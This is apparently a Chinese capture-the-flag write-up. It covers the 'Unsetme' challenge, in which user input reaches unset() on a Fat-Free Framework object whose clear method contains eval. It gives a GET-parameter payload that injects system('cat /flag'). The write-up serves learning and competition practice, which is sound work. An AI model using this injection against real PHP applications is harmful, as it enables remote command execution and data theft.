# 初赛
## Unsetme
```PHP
<?php  
  
// Kickstart the framework  
$f3=require('lib/base.php');  
  
$f3->set('DEBUG',1);  
if ((float)PCRE_VERSION<8.0)    trigger_error('PCRE version is out of date');  
  
highlight_file(__FILE__);  
$a=$_GET['a'];  
unset($f3->$a);  
  
$f3->run();
```

f3框架
`composer require bcosca/fatfree-core`把代码下载下来，往里找

![](attachments/Pasted%20image%2020240401211637.png)

最后在clear方法中有一个eval函数

![](attachments/Pasted%20image%2020240401211736.png)

构造对应拼接即可

payload
`?a=a['/']);system('cat /flag');//`

# 决赛
## hatenum
